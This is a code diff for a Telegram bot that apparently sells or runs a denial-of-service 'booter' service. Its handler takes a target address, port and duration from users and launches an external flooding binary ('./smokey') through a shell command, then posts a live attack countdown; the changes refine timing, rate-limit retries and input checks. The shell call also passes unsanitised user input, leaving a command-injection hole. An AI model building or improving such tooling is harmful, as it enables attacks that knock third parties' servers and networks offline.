@@ -189,12 +189,12 @@ def update_attack_message(chat_id, message_id, target, port, total_time, remaini
 def handle_soul(message):
     user_id = str(message.chat.id)
     
-    # Check authorization
+    # Authorization check
     if user_id not in allowed_user_ids:
         bot.reply_to(message, "🔒 Access denied!")
         return
         
-    # Check cooldown for non-admins
+    # Cooldown check for non-admins
     if user_id not in admin_id:
         current_time = datetime.datetime.now()
         if user_id in soul_cooldown and (current_time - soul_cooldown[user_id]).seconds < COOLDOWN_TIME:
@@ -203,7 +203,6 @@ def handle_soul(message):
             return
         soul_cooldown[user_id] = current_time
     
-    # Parse command
     try:
         parts = message.text.split()
         if len(parts) != 4:
@@ -212,10 +211,14 @@ def handle_soul(message):
             
         target = parts[1]
         port = parts[2]
-        duration = int(parts[3])
         
-        if duration > 300:
-            bot.reply_to(message, "❌ Maximum attack time is 300 seconds!")
+        try:
+            duration = int(parts[3])
+            if duration > 300:
+                bot.reply_to(message, "❌ Maximum attack time is 300 seconds!")
+                return
+        except ValueError:
+            bot.reply_to(message, "❌ Time must be a valid number!")
             return
             
         # Check for existing attack
@@ -223,42 +226,91 @@ def handle_soul(message):
             bot.reply_to(message, "⚠️ You already have an active attack!")
             return
             
-        # Start attack
+        # Calculate end time for precise countdown
+        end_time = time.time() + duration
+        
+        # Start attack in background
         def run_attack():
             try:
-                subprocess.run(f"./smokey {target} {port} {duration} 599", shell=True, check=True)
+                subprocess.run(f"./smokey {target} {port} {duration} 599", 
+                              shell=True, check=True)
             except Exception as e:
                 print(f"Attack error: {e}")
         
-        # Record and log
-        record_command_logs(user_id, '/la', target, port, duration)
-        log_command(user_id, target, port, duration)
-        
-        # Start attack in thread
         attack_thread = threading.Thread(target=run_attack)
         attack_thread.start()
         
-        # Start timer display
-        msg = bot.reply_to(message, f"🔥 ATTACK STARTED 🔥\n\nTarget: {target}\nPort: {port}\nTime remaining: {duration}s\nMethod: Free")
+        # Record logs
+        record_command_logs(user_id, '/la', target, port, duration)
+        log_command(user_id, target, port, duration)
         
+        # Send initial message
+        msg = bot.reply_to(message, 
+                         f"🔥 ATTACK STARTED 🔥\n\n"
+                         f"Target: {target}\n"
+                         f"Port: {port}\n"
+                         f"Time remaining: {duration}s\n"
+                         f"Method: Free")
+        
+        # Store attack info with end_time for precise countdown
         active_attacks[message.chat.id] = {
             'target': target,
             'port': port,
             'total_time': duration,
+            'end_time': end_time,
             'message_id': msg.message_id
         }
         
-        update_attack_message(
-            message.chat.id,
-            msg.message_id,
-            target,
-            port,
-            duration,
-            duration-1
-        )
+        # Start countdown updates (first update in 5 seconds)
+        threading.Timer(5.0, update_attack_message, 
+                      args=[message.chat.id, msg.message_id, 
+                           target, port, duration, end_time]).start()
         
     except Exception as e:
         bot.reply_to(message, f"❌ Error: {str(e)}")
+
+def update_attack_message(chat_id, message_id, target, port, total_time, end_time, retry_count=0):
+    try:
+        remaining = max(0, end_time - time.time())
+        
+        if remaining > 0:
+            try:
+                # Update message with precise remaining time
+                bot.edit_message_text(
+                    chat_id=chat_id,
+                    message_id=message_id,
+                    text=f"🔥 ATTACK IN PROGRESS 🔥\n\n"
+                         f"Target: {target}\n"
+                         f"Port: {port}\n"
+                         f"Time remaining: {int(remaining)}s\n"
+                         f"Method: Free"
+                )
+                # Schedule next update in 5 seconds
+                threading.Timer(5.0, update_attack_message, 
+                              args=[chat_id, message_id, target, 
+                                   port, total_time, end_time]).start()
+            except telebot.apihelper.ApiTelegramException as e:
+                if e.error_code == 429:  # Rate limited
+                    retry_after = int(e.result_json.get('parameters', {}).get('retry_after', 5))
+                    time.sleep(retry_after)
+                    update_attack_message(chat_id, message_id, target, port, total_time, end_time, retry_count + 1)
+                else:
+                    raise e
+        else:
+            # Attack completed
+            bot.edit_message_text(
+                chat_id=chat_id,
+                message_id=message_id,
+                text=f"✅ ATTACK COMPLETED ✅\n\n"
+                     f"Target: {target}\n"
+                     f"Port: {port}\n"
+                     f"Duration: {total_time}s\n"
+                     f"Method: Free"
+            )
+            if chat_id in active_attacks:
+                del active_attacks[chat_id]
+    except Exception as e:
+        print(f"Error updating attack message: {e}")
 
 @bot.message_handler(commands=['mylogs'])
 def show_command_logs(message):
